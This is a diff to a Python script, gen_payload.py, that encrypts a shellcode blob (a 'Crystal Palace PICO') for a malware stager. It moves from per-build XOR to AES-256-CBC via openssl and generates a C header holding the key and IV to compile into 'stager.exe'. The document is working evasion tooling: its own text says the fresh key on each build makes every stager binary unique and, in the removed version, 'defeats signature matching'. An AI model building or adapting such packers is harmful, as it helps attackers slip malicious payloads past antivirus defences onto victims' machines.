@@ -1,40 +1,52 @@
 #!/usr/bin/env python3
 """
-gen_payload.py — XOR-encrypt a PICO blob and emit a C header.
+gen_payload.py — AES-256-CBC encrypt a Crystal Palace PICO blob.
 
-Each build generates a fresh random 256-byte key so every compiled stager
-has a unique byte pattern in its .data section — defeats signature matching.
+Outputs:
+  <payload.dat>  AES-256-CBC ciphertext — deliver alongside stager.exe
+  <key.h>        C header with key/iv arrays — compiled into stager.exe
 
-Usage: gen_payload.py <input.bin> <output.h>
+Fresh random key + IV every run so each stager binary is unique.
+
+Usage:
+  python3 gen_payload.py <input.bin> <payload.dat> <key.h>
+
+Requires: openssl(1) in PATH (standard on Kali/Debian).
 """
-import os, sys
+import os, sys, subprocess
 
-if len(sys.argv) != 3:
-    print(f"Usage: {sys.argv[0]} <input.bin> <output.h>", file=sys.stderr)
+if len(sys.argv) != 4:
+    print(f"Usage: {sys.argv[0]} <input.bin> <payload.dat> <key.h>",
+          file=sys.stderr)
     sys.exit(1)
 
-infile, outfile = sys.argv[1], sys.argv[2]
+infile, datfile, keyfile = sys.argv[1:]
 
-key = os.urandom(256)   # fresh key every build
+key = os.urandom(32)   # AES-256 key
+iv  = os.urandom(16)   # CBC IV
 
-with open(infile, 'rb') as f:
-    raw = f.read()
+subprocess.run([
+    'openssl', 'enc', '-aes-256-cbc', '-nosalt',
+    '-K', key.hex(), '-iv', iv.hex(),
+    '-in', infile, '-out', datfile,
+], check=True)
 
-enc = bytes([b ^ key[i % len(key)] for i, b in enumerate(raw)])
-
-def c_array(name, data, type_='unsigned char'):
-    lines = [f'static const {type_} {name}[] = {{']
+def c_bytes(name, data):
+    lines = [f'static const unsigned char {name}[] = {{']
     for i in range(0, len(data), 16):
         chunk = data[i:i+16]
         lines.append('    ' + ','.join(f'0x{b:02x}' for b in chunk) + ',')
     lines.append('};')
     return '\n'.join(lines)
 
-with open(outfile, 'w') as f:
+with open(keyfile, 'w') as f:
     f.write('/* auto-generated — do not edit */\n\n')
-    f.write(c_array('pico_key', key))
-    f.write(f'\nstatic const unsigned int pico_key_len = {len(key)};\n\n')
-    f.write(c_array('pico_payload', enc))
-    f.write(f'\nstatic const unsigned int pico_payload_len = {len(enc)};\n')
+    f.write(c_bytes('payload_key', key))
+    f.write(f'\nstatic const unsigned int payload_key_len = {len(key)};\n\n')
+    f.write(c_bytes('payload_iv', iv))
+    f.write(f'\nstatic const unsigned int payload_iv_len = {len(iv)};\n')
 
-print(f'[+] pico_payload.h: {len(raw)} bytes encrypted, key_len={len(key)}', file=sys.stderr)
+enc_size = os.path.getsize(datfile)
+print(f'[+] {datfile}: {enc_size} bytes  (AES-256-CBC, no salt)',
+      file=sys.stderr)
+print(f'[+] {keyfile}: key_len=32  iv_len=16', file=sys.stderr)
